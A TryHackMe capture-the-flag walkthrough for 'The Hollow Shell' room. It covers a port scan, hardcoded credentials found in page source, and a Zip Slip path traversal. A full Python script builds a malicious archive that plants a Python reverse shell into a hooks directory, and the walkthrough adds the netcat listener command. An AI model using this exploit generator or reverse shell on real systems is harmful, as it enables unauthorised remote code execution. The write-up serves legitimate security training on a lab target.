# The Hollow Shell Walkthrough
<br/>

## Intro
Welcome to the *The Hollow Shell* challenge, here is the link to the [room](https://tryhackme.com/room/hh-thehollowshell-ddb582ac) on TryHackMe.

This is supposed to be a medium level challenge about web exploitation, but actually, since it revolves on a single vulnerability, without any "defense" if you know the type of vuln is quite easy.


"*You find it on the beach: pretty, ordinary, the kind of thing nobody thinks to check. Slip something inside and hold it to your ear.
The Byte Lotus beachfront lets guests personalise their in-room display by uploading a shell — a little souvenir pack of shoreline ambiance. Staff publish them through the Shoreline Display portal, and once a shell is "held to the room's ear" it plays its shore. Slip past what the portal forgets to check, and the shell answers with a shell of your own.*"

Whenever you feel ready press on "start machine" and connect via OpenVPN or by using the AttackBox.

Let's begin!

<br/>
<br/>

## The Challenge
We start our target enumeration with a port scan:
```bash
sudo nmap -sS -vv MACHINE_IP
```

We find 2 open ports:
```bash
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 62
5000/tcp open  upnp    syn-ack ttl 62
```

I feel like that port 5000 service was not properly identified, we can focus on that one:
```bash
 nmap -sV -sC -p 5000 10.81.133.224
```

As we tought we find another service, an HTTP server:
```
PORT     STATE SERVICE VERSION
5000/tcp open  http    Gunicorn
| http-title: Byte Lotus \xE2\x80\x94 Room Service
|_Requested resource was /login
|_http-server-header: gunicorn
```

We can take a look at it by visiting in our browser `http://10.81.133.224:5000/login`, here we find a login page where we have to insert the STAFF ID and a passphrase.

Let's look for more clues in the page *source code*, here we find an interesting comment:
```html
  <!--
    ───────────────────────────────────────────────────────────────
     Byte Lotus // internal display-manager portal
     New on the floor team? IT seeds every property with the same
     starter login until you set your own:
         user: concierge
         pass: Stay--REDACTED-FOR-THE-WRITEUP--
     (rotate it from Settings on first sign-in — most people forget)
    ───────────────────────────────────────────────────────────────
  -->
```

Hardcoded credentials, nice, we can now take them and login.

After login we get redirected to `/dashboard` where there is a function to upload a zip file via a POST request to `/upload`:
```html
      <form method="post" action="/upload" enctype="multipart/form-data">
        <label for="shell">Shell (.zip)</label>
```

We are also told that there are some allowed asset types: `png jpg gif svg css json`.

Client side, in the page source, we cannot see any script handling the file extension validation, this means that there is none at all or that it is implemented server side.
We can try upload a test file like `test.py` containg a simple test script like:
```python
print("this is a test!")
```

It fails with the following message `That doesn't look like a shell (.zip expected).`, this confirms that there is a kind of checking in the back-end.
Now let's try to upload another test file, this time as a `.zip` containing `shell.json`.
```json
 {
	"value": "test json"
 }
```

Crete the archive:
```bash
 zip test.zip shell.json
```

Now upload it, the request would look like this one:
```http
POST /upload HTTP/1.1
Host: 10.81.133.224:5000
Content-Length: 382
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKY6QllCThoZy8q2A
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: http://10.81.133.224:5000
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.81.133.224:5000/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJzdGFmZiI6ImNvbmNpZXJnZSJ9.anOmCg.UDLG9M96kk_GbTj767uf57_J4eY
Connection: keep-alive

------WebKitFormBoundaryKY6QllCThoZy8q2A
Content-Disposition: form-data; name="shell"; filename="test.zip"
Content-Type: application/zip

PK --HERE THE REST OF THE CONTENT-- 
------WebKitFormBoundaryKY6QllCThoZy8q2A--

```

We get this new error: `Shell rejected: shell.json is missing a 'name'`.
We can fix that, re create the archive and re upload:
```json
 {
	"name": "test",
	"value": "test json"
 }
```

This time it gets uploaded with no errors and we get uploaded file location:
```
Shell 'test' brought ashore. Stored at shells/513dc4e6c503/ and held to the room's ear.
```

Very cool, but now we need to find out a vulnerablility to take advantage of that and gain RCE.

Another thing to notice is that, thanks to *Wappalizer*, we know that the server runs with Python.

That with the zip upload points us to a **ZIP SLIP** vulnearbility, at least as an idea, now we need to verify if that is the case or we need to move somewhere else.

That vulnerability is essentially a failuer in the sanitization of the file names inside the archive, if someone puts as name containing `../` we could path traversal in the server and chose the location where the file would be saved. This leads to arbitrary file read and write, and the possiblilty for an RCE if other factors comply.

The idea here is to use the Zip Slip vulnerability to write a file outside the intended upload directory. In this challenge, the application automatically loads Python code from the `hooks/` directory. By creating a ZIP entry with a traversal path such as `../../hooks/callback.py`, we can force the extracted file to land in that directory.

When the Python process starts, restarts, or reloads, its hooks the planted Python file is loaded/executed by the application. This gives us code execution. 

In this case, the reverse shell written to `hooks/callback.py` is our "hook".

<br/>

### Exploitation

We can automate the creation of the malicous zip file with this python script:
```python
#!/usr/bin/env python3
# Drops a Python reverse shell into the ../../hooks/ directory to achieve RCE.

import zipfile
import json
import argparse
import sys

def generate_rev_shell_code(lhost, lport):
    """Constructs the Python reverse shell payload dynamically."""
    payload = f"""import socket, os, pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{lhost}", {lport}))
for fd in range(3):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/bash")"""
    return payload

def build_exploit_archive(output_path, lhost, lport):
    # The server expects this specific manifest structure to process the upload
    manifest = {
        "name": "reverse",
        "assets": []
    }
    
    # Convert manifest to JSON bytes
    manifest_json = json.dumps(manifest).encode('utf-8')
    
    # Get the reverse shell payload and encode to bytes
    shell_code = generate_rev_shell_code(lhost, lport).encode('utf-8')
    
    # The traversal path to escape the upload directory and land in the auto-executing hooks folder
    malicious_path = "../../hooks/callback.py"
    
    try:
        # Create the zip file using ZipInfo for granular header control
        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            # Write the benign manifest file
            zf.writestr(zipfile.ZipInfo("shell.json"), manifest_json)
            
            # Write the malicious payload with directory traversal
            zf.writestr(zipfile.ZipInfo(malicious_path), shell_code)
            
        print(f"[+] Exploit archive created: {output_path}")
        print(f"[+] Payload will trigger a reverse shell to {lhost}:{lport}")
    except Exception as e:
        print(f"[-] Error generating payload: {e}")
        sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="The Hollow Shell - Zip Slip RCE Generator")
    parser.add_argument("-o", "--out", default="rce-zipslip.zip", help="Name of the output zip file")
    parser.add_argument("-i", "--ip", required=True, help="Your attacker IP (LHOST)")
    parser.add_argument("-p", "--port", type=int, default=4444, help="Your listener port (LPORT)")
    
    args = parser.parse_args()
    build_exploit_archive(args.out, args.ip, args.port)
```

This script will automate the creation and "zipping" of 2 files:
- `shell.json` containing:
```json
{"name": "reverse", "assets": []}
```

And  `../../hooks/callback.py` containing the actual code for the reverse shell:
```python
import socket, os, pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.81.111.152", 1234))
for fd in range(3):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/bash")
```

Now run the creation script and put your IP and port where you would set the listener:
```bash
python3 exploit.py -i 10.81.111.152 -p 1234
```

Prepare a listener on your machine:
```bash
nc -lvnp 1234
```

Now everything is set, upload the `rce-zipslip.zip` on the website.

Then navigate to `http://10.81.157.9:5000/shells/bfe3e90a16bb/shell.json` the `bfe3e90a16bb` would be different for you, so ensure to read it in the message after the upload.
<br>

And now you will have a shell in your termianl, we can check which user we are:
```bash
id
```

We are an user called "roomservice": `uid=996(roomservice) gid=996(roomservice) groups=996(roomservice)`.

We can now go into its home directory and read the flag:
```bash
cd; cat flag.txt
```

--> REDACTED

<br/>
<br/>

Congratulations, you have successfully exploited zip slip vulnerability to execute a reverse shell payload, which gained you access to the target system and to the flag!


Hope you had fun following along and completing the challenge.

Catch you in the next CTF 😃 
